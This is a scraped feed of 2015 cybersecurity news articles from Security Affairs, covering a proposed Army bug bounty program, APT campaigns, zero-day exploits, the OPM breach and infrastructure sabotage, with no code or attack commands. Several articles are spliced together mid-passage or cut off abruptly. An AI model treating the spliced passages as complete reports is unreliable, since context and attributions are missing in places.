The post highlights the need of a Response Program for vulnerabilities affecting US army systems.\n\nCurrent and former members of the department\u2019s cyber wing of the US Army, Captain Michael Weigand and Captain Rock Stevens, urge a  joint project between the Army Cyber Institute and the US Marine Corps Forces Cyberspace Command.\n\nThe military experts highlighted how essential aspects of the software lifecycle, like patch management and penetration testing  are very difficult to carry on in these environments. The systems used in the US Army are exposed by an absence of centralized patch management and penetration testing are not allowed due to nature of the systems.\n\n\u201cPersonnel who discover vulnerabilities encounter stumbling blocks from the first step of responsible disclosure\u2013initial notification. If an employee does find the contact information for a developer or program office, there is no external incentive or repercussion for a responsible party to action the report or intelligence that is provided to them.\u201d states the post. \u201cAdditionally, it is possible that the report recipient could misinterpret the findings, not as valuable and friendly intelligence but rather as a threat to their contract, command, or system. Both scenarios yield the same result\u2013the vulnerability remains and the report is dismissed. This wastes researcher\u2019s time, hard work, and promotes a \u201cdo-nothing\u201d culture.\u201d\n\nReporting vulnerabilities could be a risky initiative for the bug hunter, the US Army could revoke them the security clearances, the access to IT systems, and face \u201cpunitive action\u201d under the Uniform Code of Military Justice which they describe as \u201cviable outcomes\u201d for those who \u201ccasually stumble\u201d on bugs.\n\n\u201cThe most unfortunate outcome is that service members who become aware of vulnerabilities feel helpless to positively affect the situation. Meanwhile, those who wish to do harm to our nation are free from such worries,\u201d the experts added. \u201cAdditionally, no US Government program exists that permits active security assessments of networks or software solutions using custom tools or techniques. Most importantly, the Army does not have a single entity that tracks discovered issues from initial report through the remediation process to ensure vulnerability resolution in a timely manner. Most of the Army\u2019s critical systems are underpinned by networked software \u2014 from tanks and missile launchers to battle command and communication systems. The Army does not have one central location for responsibly disclosing software vulnerabilities across all of its systems. Without a means to report vulnerabilities in Army software or networks, vulnerabilities go unreported and leave our information systems exposed to adversarial attacks.\u201d\n\nThey call for a radical change, including the introduction of bug bounties, today internal experts who discovered vulnerabilities have no incentive to report the flaw are no obliged to disclose it, the post refers this bad habit as a \u201cdo nothing\u201d culture.\n\n\n\nIn a paper published on the Cyber Defense Review website, the duo proposes the creation of an Army Vulnerability Response Program (AVRP), a bug bounty program run by the US military.\n\nThe Army Vulnerability Response Program (AVRP) platforms proposed by the military expert have to enable service people to report bugs free of risk of retribution, and say penetration tests should be promoted as vulnerability scans are inadequate.\n\n\u201cThe AVRP will serve as the central reporting mechanism for vulnerabilities in Army networks and will receive reports on poor configurations or gaps in security that could allow attackers to degrade Army systems. These systems include Army digital training management systems, Army Battle Command Systems, logistics procurement systems, and combat platforms deployed in hostile environments. Researchers can report vulnerabilities through a phone hotline or an online submission portal. The AVRP will track all submissions, facilitate the flow of communication with affected entities, and play an integral role in resolving the vulnerability throughout US government networks,\u201d the paper reads.\n\nThe AVRP project would be a closed program specifically designed for Department of Defense staff, but it is important also to involve externals although they would not be involved in the remediation process.\n\nAs an alternative to a bug bounty program completely managed by the US Army, the experts suggested using the services of specialized organizations such as Zero Day Initiative or Bugcrowd, but the costs would be high.\n\n\u201cIf implementing an Army-run bug bounty program is not within the immediate goals/desire of any organization, there are third-party programs that can manage the program for the Army such as the Zero Day Initiative (ZDI) and Bug Crowd. Utilization of these third party programs would require a change to their current practices to handle classified disclosures which would most likely come at a substantial cost.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Army Vulnerability Response Program (AVRP), bug bounty program)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/avrp", "topic_name": "AVRP"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/bug-bounty", "topic_name": "Bug Bounty"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/military-bug-bounty-program-avrp", "topic_name": "military bug bounty program AVRP"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/patch-management", "topic_name": "patch management"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/penetration-testing", "topic_name": "penetration testing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-army", "topic_name": "US Army"}]}, {"news_name": "The cyber labor market in Israel, the cyber guild", "news_link": "https://securityaffairs.co/wordpress/41446/intelligence/israel-the-cyber-guild.html", "title": "The cyber labor market in Israel, the cyber guild\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 26, 2015", "body": "Cyber technology could be a catalyst to equality in the labor market. Its power is seeded in the ability of everyone to gain skills without social entry barriers. To succeed in the cyber labor market, one has to have curiosity, creativity and the Patience to learn a computer language. In contrast to other skills, one can study everything from books or from the Internet. To be a hacker, Programmer, or any other profession in the ICT / Cyber labor market, one has to be an autodidact with passion. \n\nThe freedom to gain a skill can give any men or women the equal chance of social mobility in the cyber labor market, is due to the principles the cyber domain is based on \u2013 openness, information sharing and a liberal view that everyone can.  \n\nSadly, a look at the labor market at countries that have a developed cyber industry, such as Israel, will reveal the opposite. I will discuss the Israeli cyber market, but my argument is true for any other such as a country.  \n\nIn Israel, there is an advanced cyber security industry, based mostly on veterans from two intelligence units. When I say, \u201ccyber security industry\u201d I refer to entrepreneurs who drive the startup scene, or in its other name \u2013 Startup nation. In fact, in the Israeli cyber labor market, there is a new guild \u2013 the cyber guild. And this guild is composed of Those veterans who are the human infrastructure behind this industry. And it\u2019s not theirs to blame.  \n\nThe Israeli cyber industry is based on the army. It\u2019s not secret. And in the army, the intelligence units use the most advanced technology they can find or develop. The reason for that is lying in the pursuit of knowledge. If you want to be ahead of your enemy, you have to know his moves. And if you master the knowledge gathering process, fusion process and distribution process, you have the skills for the cyber labor market. With abstraction, it can be said that cyber defense or offense, is a game of knowledge.  \n\n\n\nAfter the veterans go to the civil market, they make a spin-off to the technologies they exposedto in their units. And there you have it \u2013 young people, fearless, with expertise they got in the army funding hundreds of startups that makes the industry monotonous, controlled by those people. That\u2019s the guild. And as one, it maintains itself. Friend brings a friend. Although recently, there has been a shift because of a shortage of skilled workers, it hasn\u2019t changed the core diversity in the cyber labor market.  \n\nAs mentioned before, the problem isn\u2019t with the guild, but in the system that created it. If the system changes, the guild will dismantle. And the system is the government that regulates the labor market. Instead of encouraging the distortion in the cyber labor market, the government, through the education system and the army, has to establish a more \u2018fair\u2019 distribution system of cyber skills in the population, regardless of their military service. In this way, the distortion in the cyber labor market Will be reduced. \n\nTo summarize, the cyber era is a great opportunity for governments around the world to create a better society by reducing the inequality in the labor market. Most of the skills needed for jobs in the cyber labor market can be gained freely by old or young people. It\u2019s true that not everybody will like to work as a programmer, hacker or IT staff, but the door should be open by default to those who want. And the responsibility for it lies with the government.   \n\nAmi isAn Israeli-based writer, tech corresponded of the Israel Defense magazine.

The documents, provided by a whistleblower, offer an unprecedented glimpse into Obama\u2019s drone wars.\u201d states the Intercept.\n\n\u201cThe revelations about the CIA and Joint Special Operations Command actions include primary source evidence that as many as 90 percent of US drone killings in one five month period weren\u2019t the intended target, that a former British citizen was killed in a drone strike despite repeated opportunities to capture him instead, and details of the grisly process by which the American government chooses who will die, down to the \u201cbaseball cards\u201d of profile information created for individual targets, and the chain of authorization that goes up directly to the president.\u201d Reported Wired.\n\nAccording to The intercept, it looks like these leaked documents came from the same source, an anonymous whistleblower, but this time, in opposition to what happened with WikiLeaks and Snowden, this anonymous whistleblower released statements on the leaked information:\n\n\u201cThis outrageous explosion of watchlisting\u2014of monitoring people and racking and stacking them on lists, assigning them numbers, assigning them \u2018baseball cards,\u2019 assigning them death sentences without notice, on a worldwide battlefield\u2014it was, from the very first instance, wrong,\u201d \u201cWe\u2019re allowing this to happen. And by \u2018we,\u2019 I mean every American citizen who has access to this information now, but continues to do nothing about it.\u201d\n\nLaura Poitras the director of the movie Citizenfour (also co-founder of The Intercept) shows in the movie Glenn Greenwald (also co-founder of The Intercept) talking with Snowden about a new source holding information relatedtoh the drone program.\n\nIn the same scene it can be seen Greenwald drawing a \u201cdiagram of the authorization chain for drone strikes that ends with the president\u201d where Snowden tells \u201cIt\u2019s really risky,\u201d, \u201cThat person is incredibly bold.\u201d, where Greenwald replies, \u201cThe boldness of it is shocking, \u201dBut it was obviously motivated by what you did.\u201d\n\nThis scene looks to hold up to the newly released documents that can be found in the Intercept website.\n\nStill talking about the movie, Greenwald shows to Snowden the tools used to communicate with the source (written in a piece of paper). This probably means that they found a way to communicate without raising alerts.\n\nBefore we got leaks from NSA and their program, and we started to understand how this part of the government works, this time we will start knowing a new part of the government we didn\u2019t, like Greewald said: \u201cPeople are going to see what\u2019s being hidden by a totally different part of the government.\u201d\n\nI was impressed by the content of the documents on the drone wars, in particular, let me suggest the reading of  article titled \u201cFind,Fix,Finish,\u201d which explain what happened soon after Obama was elected president. Obama was strongly urged by Michael Hayden, the outgoing CIA director, and his new top counterterrorism adviser, John Brennan, to adopt the way of the scalpel, targeted and surgical killing operations conducted with drone strikes.\n\n\n\n\u201cIn one briefing, Hayden bluntly told Obama that covert action was the only way to confront al Qaeda and other terrorist groups plotting attacks against the U.S.\u201d states the post.\n\nAbout the Author Elsio Pinto\n\nPierluigi Paganini\n\n(Security Affairs \u2013 drone wars,  military)\n\n", "topics": ""}, {"news_name": "Facebook.

This is what the notification looks like on the desktop version of the Facebook website:\u201d Alex Stamos, Chief Security Officer at Facebook, states in a blog post. \u201cWe do this because these types of attacks tend to be more advanced and dangerous than others, and we strongly encourage affected people to take the actions necessary to secure all of their online accounts. \u201c\n\n\n\nFacebook is already monitoring users\u2019 account for potential compromise while offering users the possibility to proactively secure their accounts. In June, Facebook released two security tools, the Security Checkup and the cleanup tool, aimed at improving the security posture of its users.   The Security Checkup is a tool warn users on the browsers and apps they used to access their accounts, meanwhile the cleanup tool developed in a joint effort with AV firms such as Kaspersky Lab.\n\nThe company will provide users with the possibility to enable the \u201cLogin Approvals\u201d feature that would ensure that hackers cannot login into a user\u2019s account. The alert would be triggered also if the Facebook account is accessed from a new device or browser, also in these cases the user will receive a security code on the mobile phone he registered.\n\nAlex Stamos highlighted that the alert doesn\u2019t mean that the Facebook\u2019s platform has been hacked, instead there is the concrete risk that the user\u2019s device might have been infected with malware. Facebook hasn\u2019t provided further information regarding the method it uses to detect the nature of the attack (i.e. nation-state attacks, frauds), anyway it highlighted that it is focused on state-sponsored attacks that are often very sophisticated.\n\n\u201cTo protect the integrity of our methods and processes, we often won\u2019t be able to explain how we attribute certain attacks to suspected attackers. That said, we plan to use this warning only in situations where the evidence strongly supports our conclusion. We hope that these warnings will assist those people in need of protection, and we will continue to improve our ability to prevent and detect attacks of all kinds against people on Facebook,\u201d added Stamos.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Facebook, state-sponsored hackers)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/facebook", "topic_name": "Facebook"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nation-state-attacks", "topic_name": "nation-state attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacker", "topic_name": "state-sponsored hacker"}]}, {"news_name": "The ISIL is trying to hack American electrical power companies", "news_link": "https://securityaffairs.co/wordpress/41163/cyber-crime/isil-vs-us-electrical-power-companies.html", "title": "The ISIL is trying to hack American electrical power companies\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 17, 2015", "body": "According to the U.S. law enforcement, the ISIL is trying to hack American energy firms, the news arrives while the US Government  has charged for the first time a man of cyberterrorism.\n\nThe news was revealed by law enforcement officials during a conference of American energy firms that were discussing Homeland Security. The ISIL has the cyber capabilities to run cyber attacks against US critical infrastructure and the US intelligence is aware of the risks.\n\nIn May 2015, Pro-ISIL Hackers belonging to the Cyber Caliphate hacking team threatened \u2018Electronic War\u2019 on US and Europe.\n\n\u201cISIL is beginning to perpetrate cyberattacks,\u201d explained Caitlin Durkovich, assistant secretary for infrastructure protection at the Department of Homeland Security.\n\nInvestigators revealed to CNNMoney that Islamic State have run a series of cyber attacks that have been unsuccessful. They avoided to provide further information on the attacks neither cited evidence of specific incidents.\n\nThe experts described the attacks as not particularly sophisticated, anyway they represent a serious threat to the Homeland Security. ISIL hackers use to buy hacking tools in the black markets, there is no evidence that they are developing their own \u201ccyber weapons.\u201d\n\n\u201cStrong intent. Thankfully, low capability,\u201d said John Riggi, a section chief at the FBI\u2019s cyber division. \u201cBut the concern is that they\u2019ll buy that capability.\u201d\n\nThe risk of a cyber attack is scaring law enforcement, an incident on power companies could disrupt the flow of energy to U.S. homes and businesses.\n\nThe problem is not limited to the ISIL, also domestic terrorists and foreign state-sponsored hackers could cause serious damage. In the past industrial control systems at the energy industry were attacked by Russian hackers,\n\nIn July 2014 researchers at FireEye detected a new variant of Havex RAT that was specifically designed to scans SCADA network via Object linking and embedding for Process Control (OPC), control systems hit by the malware are vital components in any industrial process including energy.\n\nIn June 2014 experts at F-Secure discovered instances of the Havex malware used to targetIndustrial Control Systems (ICS) in surgical attacks implementing \u201cwatering-hole attack\u201d scheme which involved ICS vendor site as intermediary target.  It has been estimated that the number of compromised energy companies in the US and Europe is nearly 1000, an impressive number that gives us an idea of the impact of the Havex operation.\n\nIn November 2014, the US-CERT issued an Alert (ICS-ALERT-14-281-01A) related to an ongoing sophisticated Malware campaign compromising ICS systems with BlackEnergy malware.\n\n\u201cThey\u2019d love to do damage, but they just don\u2019t have the capability,\u201d said the Mark Lemery, a critical infrastructure protection coordinator. \u201cTerrorists have not gotten to the point where they\u2019re causing physical damage.\u201d\n\nThe experts sustain that an attack on the entire U.S. energy grid is not simple because the national infrastructure is \u201ca chaotic patchwork of \u201cgrids,\u201d each with different types of machines and software that don\u2019t smoothly coordinate or communicate\u201d.\n\nHow to protect critical infrastructure from cyber attacks of terrorist group like the ISIL?\n\nAs explained by Riggi, it is necessary a joint effort of law enforcement and intelligence agencies inside the US and also on a global scale.\n\n\n\n\u201cWe\u2019ve had pretty good success actually,\u201d Riggi said. \u201cSince the FBI is an intelligence agency, we rely on the help of CIA and NSA. We compare information with the NSA.\u201d\n\nWhat will happen if hackers will hit critical infrastructure in the US, which will be the economic impact of a cyber attack against a power grid?\n\nAccording to a poll done by Morning Consult firm, cyber attacks are just behind terrorism attacks on the list of biggest threats to the US, it has been estimated that the insurance industry could face losses of about $21 billion.\n\nIf you want more info give a look to my report \u201cCyber Attacks on the Power Grid: The Specter of Total Paralysis\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Energy industry, ISIL)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/atp", "topic_name": "ATP"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/blackenergy", "topic_name": "BlackEnergy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dark-comet", "topic_name": "Dark Comet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/energy-industry", "topic_name": "energy industry"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/havex-rat", "topic_name": "Havex RAT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/industrial-control-systems", "topic_name": "industrial control systems"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/isil", "topic_name": "ISIL"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spyware", "topic_name": "spyware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-attacks", "topic_name": "state-sponsored attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-government", "topic_name": "US Government"}]}, {"news_name": "Pawn Storm used a new Flash Zero-Day in attacks on the NATO & the While House", "news_link": "https://securityaffairs.co/wordpress/41057/cyber-crime/pawn-storm-flash-0day.html", "title": "Pawn Storm used a new Flash Zero-Day in attacks on the NATO & the While House\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 15, 2015", "body": "Once again Flash in the headlines, beware next emergency Flash Player update is critical for everybody as explained by the experts at Trend Micro.\n\nThe researchers at the security firm explained that the update will fix a vulnerability that has been exploited in the wild by the notorious Pawn Storm APT in targeted phishing attacks against government entities, in particular several foreign affairs ministries across the world. In October 2014, the experts at Trend Micro discovered a cyber espionage operation targeting military, government and media agencies on a global scale. The researchers collected evidence that the threat actors behind the operation, dubbed Operation Pawn Storm, have been active since at least 2007 and are still running several attacks worldwide.\n\n\u201cTrend Micro researchers have discovered that the attackers behind Pawn Storm are using a new Adobe Flash zero-day exploit in their latest campaign.\u201d states the post published by the security firm.\n\nThe researchers explained that the zero-day exploited by the Pawn Storm works with Adobe Flash Player versions 19.0.0.185 and 19.0.0.207, this means that the flaw affects most current versions of the software.

Aside from malware attacks, fake Outlook Web Access (OWA) servers were also set up for various ministries. These are used for simple, but extremely effective, credential phishing attacks.

Check Point took actions to prevent this document from further infecting the customer\u2019s network, and also analyzed the file to better understand the attack. The result was a discovery of a larger-scale campaign that has been targeting Israeli public and private organizations for some time.\u201d states a blog post published by Check Point.\n\nThe threat actors rely on RTF documents infected with the Zeus Trojan, this was no ordinary phishing or macro  attack. The particulars of the attack is that the document was auto-generated by Microsoft Word Intruder (MWI) exploit kit.\n\n\u201cthe document utilized three different remote code execution vulnerabilities in MS-Word. The specific vulnerabilities being exploited were enough to determine that this malicious document was not crafted by hand, but rather auto-generated by a well-known exploit kit called Microsoft Word Intruder (MWI).\u201d continues the post.\n\nThe analysis of the network traffic generated by the Zeus Trojan revealed that it contact the C&C server by using an HTTP GET request. The C&C server was owned by a legitimate local residential letting agency abroad, which had been compromised by the threat actors.

Naikon is the group which was involved in a cyber espionage campaign shortly after Malaysia Airlines Flight MH370 disappeared. Recently the group engaged a hacking dispute with another APT dubbed Hellsing.\n\nIn May, Kaspersky Lab published a detailed report on the Naikon APT group and its cyber espionage operations. According to the experts the group uses advanced hacking tools.\n\nThe Naikon APT group carried out surgical spear phishing attacks against its targets, the hackers relied on Word or Office documents to trigger a buffer overflow in the ActiveX controls of a MSCOMCTL.OCX Windows library (CVE-2012-0158).\n\nThe exploit allows attackers to infect victims with RAT and establish a backdoor on the victim\u2019s system.\n\nGe is not described as a simple military but as an academic. The researchers discovered that his location is the headquarters of the PLA technical reconnaissance bureau by analyzing his online activity.\n\n\n\n\u201cDoing this kind of biopsy, if you will, of this threat through direct analysis of the technical and non-technical evidence allows us to paint a picture of the rest of this group\u2019s activity,\u201d said Rich Barger, CIO and cofounder of ThreatConnect. \u201cWe\u2019ve had hundreds of hashes, hundreds of domains, and thousands of IPs [related to PLA unit 78020]. Only looking at this from a technical lens only gives you so much. When you bring in a regional, cultural and even language aspect to it, you can derive more context that gets folded over and over into the technical findings and continues to refine additional meaning that we can apply to the broader group itself.\u201d\n\nThe report also detailed a series of operational security mistakes made by Ge, such as embedding certain names in families of malware attributed to Naikon APT group. The Naikon group and elite PLA unit appears very close.\n\n\u201cIf you look at where China is and how assertive they are in region, it might be a reflection of some of the gains and wins this group has made,\u201d Barger said. \u201cYou don\u2019t influence what they\u2019re influencing in the region if you don\u2019t have the intel support capabilities fueling that operational machine.\u201d\n\n\n\nBelow are reported Key findings from the investigation.\n\nGreat work, Enjoy the Report!\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Naikon, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ge-xing", "topic_name": "Ge Xing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/naikon", "topic_name": "Naikon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pla", "topic_name": "PLA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/unit-78020", "topic_name": "Unit 78020"}]}, {"news_name": "OPM stolen data includes 5.6 Million Fingerprints", "news_link": "https://securityaffairs.co/wordpress/40396/cyber-crime/opm-5-6-million-fingerprints.html", "title": "OPM stolen data includes 5.6 Million Fingerprints\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 24, 2015", "body": "The press secretary of the Office of Personnel Management, Sam Schumach, announced that the data breach suffered by the OPM exposed approximately 5.6 million sets of fingerprints belonging to federal employees, contractors, and other members of the staff.\n\nIn a first time, the number of sets of fingerprints that was stolen has been estimated at 1.1 million, but a new investigation presented a worst scenario.

Today, governments, the private sector, international organizations and civil society are looking to debate more about cyberspace arena.\n\nIn fact, this occasion as part of geopolitics players has a big protagonism to define what is going to happen with the traditional concept of \u2018power\u2019 and what are new trends on cyber governance to define a global mandate in Internet. From one side, \u2018hard power\u2019 as a traditional legal aspect to be deployed from governments without any substantiality until today\u2019s, by trying to recognize the Internet as a decentralize global network. This remark doesn\u2019t mean that global actors are not been able to contribute on harmonization of cyber conflict world-wide. Then, \u2018soft power\u2019 will be an alternative on cyberspace as a short-term action to give more arguments on thinkers and contributors towards to enhance strategic and political goals through technical, legal and economic means.\n\nIn this context, \u2018cyber power\u2019 is more political than any time before. It means that questions and remarks will be rising hands of cybernauts to proclam on high voice, how can governments ensure on enforcing \u2018cyber power\u2019 without risking conflict escalation?\n\nIf global citizens are not informed on new trends of cyber conflict, there is possible to experiment permanent cyber social protest movements and new global actions from cybernauts to demand establishment of a cyber-democracy.\n\nLast 9th September, Anti-Virus Pioneer John McAfee entered US Presidential Race with \u201cCyber Party\u201d. This demonstration was a good example of how cyber leaders are thinking more a more about \u2018cyber power\u2019. In fact, McAfee has decided to create his own party, in order to give more legitimacy to cyber democracy. Therefore, McAfee is convinced to transform cyberspace on a decentralize global network where human rights of cyber citizens must be respected, focusing on online privacy and domestic surveillance.\n\nFinally, \u2018cyber power\u2019 is facing new updates as a potential geopolitics\u2019 player. CyCon 2016 is a brilliant scenario to discuss what is the future of \u2018cyber power\u2019?. Which one is moving ahead \u2018hard power\u2019 or \u2018soft power\u2019 inside of today\u2019s democracies to guarantee respect on online privacy and domestic surveillance?\n\nJust quoting, what John McAfee said to CNN last 8th of September.\n\n\n\n\u201cWe are losing privacy at an alarming rate \u2014 we have none left,\u201d McAfee told the network. \u201cWe\u2019ve given up so much for the illusion of security and our government is simply dysfunctional.

This is not an isolated attack, law enforcement counted fourteenth attacks on critical communications infrastructure in the same region and security experts suspect that the attackers are carrying our the sabotage for economic and cyber warfare.\n\n\u201cThese cuts affected multiple companies causing outages in some of the Bay area and stretched up into the Sacramento area,\u201d said FBI Special Agent Greg Wuthrich in an email.\n\nThe investigation on such kind of attacks is conducted by the FBI because AT&T\u2019s fiber optic network is considered to be part of the nation\u2019s critical communication infrastructure.\n\n\u201cSomeone deliberately severed two AT&T fiber optic cables in the Livermore, Calif., Monday night, the latest in a string of attacks against the Internet\u2019s privately run backbone.\u201d reported the USA Today website adding that AT&T is offering  a 250,000 dollar reward for information on the attack.\n\nDue to the attack to the communications infrastructure, Internet and phone services in Sacramento, California, were interrupted for twenty hours.\n\nWho is behind the attacks?\n\nSecurity experts consider superficial the definition of \u201cVandals,\u201d part of the security community believes that the motivation could be more dangerous, such as sabotage or cyber espionage.\n\nTargeting critical infrastructure such as communications, grids, and power supplies are a consolidated strategy to cause large-scale damages to the target. According to the Lloyd\u2019s of London, cyber attacks would have a significant impact on multiple types of insurance, its report \u201cBusiness Blackout\u201c, analyzed the implications of a cyber attack on the US power grid.\n\nThe \u201cBusiness Blackout\u201d report tries to describe the impacts of a cyber attack on the national power grid, which causes an electrical blackout that plunges 15 US states and principal cities, including New York City and Washington DC, into darkness. Nearly 93 million people will remain without power in the scenario hypothesized by the study.\n\nThe total of claims paid by the insurance industry is estimated to be included in the interval comprised between $21.4bn and $71.1bn, depending on the evolution of the scenarios designed by the researchers.\n\n\n\nIn 2013 the FBI investigated the attack on the PG&E electrical substation in Metcalf California, security experts hypothesized that cells of terrorists were probing the incident response in case of attack. The knowledge of the response times of the internal staff and authorities could suggest the attackers the tactic to adopt to cause major damage.\n\n\u201cThe case of the Metcalf substation showed the sophisticated planning and targeting of a military special operation. It was the cutting of telephone cables that precluded the assault rifle attack on the cooling encasement of a high voltage transformer that distributed power to Silicon Valley which was meant to keep alarm signals from reaching critical personnel.\u201d continues the USA Today.\n\nMost of all of these recent attacks on US critical infrastructure occurred on the West coast, but almost identical acts of sabotage were reported in Arizona this February when unknowns targeted Internet cables. In 2014, a bomb exploded at the Nogales substation that provides power supply at the U.S. Border Patrol facilities at the Nogales U.S./ Mexican border.\n\nIntelligence analysts speculate that the attacks in the greater San Francisco and San Jose areas can be interpreted as acts of economic warfare conducted by Russia or China.\n\nThe San Francisco area and Silicon Valley are considered privileged targets for cyber espionage, by compromising communications infrastructure attackers can have access to the data traffic and syphon sensitive information, or can inject in the targeted networks malicious code to steal intellectual property.\n\nStay tuned.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 communications infrastructure, critical infrastructure)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/california", "topic_name": "California"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/communications-infrastructure", "topic_name": "communications infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/silicon-valley", "topic_name": "Silicon Valley"}]}, {"news_name": "The DUKES APT \u2013 7 years of Russian state sponsored hacking", "news_link": "https://securityaffairs.co/wordpress/40214/cyber-crime/the-dukes-apt.html", "title": "The DUKES APT \u2013 7 years of Russian state sponsored hacking\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 17, 2015", "body": "Security researchers at F-Secure have published an interesting report detailing the cyber espionage operation of a Russian APT group, dubbed the Dukes, the experts speculate the group is backed by the Russian government.

All the targeted organizations manage information of interest for the Russian government, in April 2014 researchers at F-Secure analyzed a number of documents referring political issues like the crisis in the Ukraine or NATO informative in the attempt to circumvent the victims.

The Obama administration was already considering to punish hackers and organizations targeting US entities, recently it proposed sanctions for Chinese hackers and individuals and firms from other nations responsible for cyber attacks against American commercial companies.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Information Warfare, Pentagon)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/credit-card", "topic_name": "credit card"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-breach", "topic_name": "data breach"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pentagon", "topic_name": "Pentagon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-government", "topic_name": "US Government"}]}, {"news_name": "North Korea exploits a 0-day in the South Korea\u2019s principal Word processor", "news_link": "https://securityaffairs.co/wordpress/40029/hacking/north-kore-0-day-hangul.html", "title": "North Korea exploits a 0-day in the South Korea\u2019s principal Word processor\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 10, 2015", "body": "Security experts from FireEye speculate that The North Korea has carried out cyber attacks against entities of the South Korea by exploiting a zero-day ( CVE-2015-6585) in a word processing program widely used in that country, the Hangul Word Processor.\n\nAccording to a report published by FireEye, the Hangul Word Processor is a proprietary software primarily used by government and public institutions in the South Korea, for this reason, the North Korea allegedly exploited it the an attack vector.\n\nThe CVE-2015-6585 was fixed a few days ago by the developer of the Hangul Word Processor, Hancom.\n\n\n\nExperts at FireEye have warned that the attribution is definitive, but the circumstance, the attack scenario and the target chosen by threat actor led the research to believe that the North Korea is behind the cyber attacks.\n\n\u201cWhile not conclusive, the targeting of a South Korean proprietary word processing software strongly suggests a specific interest in South Korean targets, and based on code similarities and infrastructure overlap, FireEye Intelligence assesses that this activity may be associated with North Korea-based threat actors.\u201d states the report published by FireEye.\n\nThe researchers explained that once an instance of the malicious Hangul Word Processor is opened by victims, it installs a backdoor on the target. FireEye dubbed the backdoor HANGMAN, it implements functionalities common to such category of malware.\n\n\u201cThe malicious HWPX documents all install similar copies of a backdoor that we call HANGMAN. HANGMAN is capable of uploading and downloading files, process and file system management, gathering system information, and updating its configuration. The backdoor also wraps its communication protocol with SSL. HANGMAN begins communications by sending a legitimate SSL handshake to its command and control (C2) server. It then continues to communicate using SSL header messages, but the payload of the message is a custom binary protocol. \u201d continues the report.\n\nBy analyzing the code of the HANGMAN backdoor the researchers discovered the presence of hard-coded IP addresses belonging to the command and control infrastructure, these IPs have been linked to other suspected North Korea-related attacks.\n\nHangman presents several similarities with another backdoor discovered by FireEye dubbed 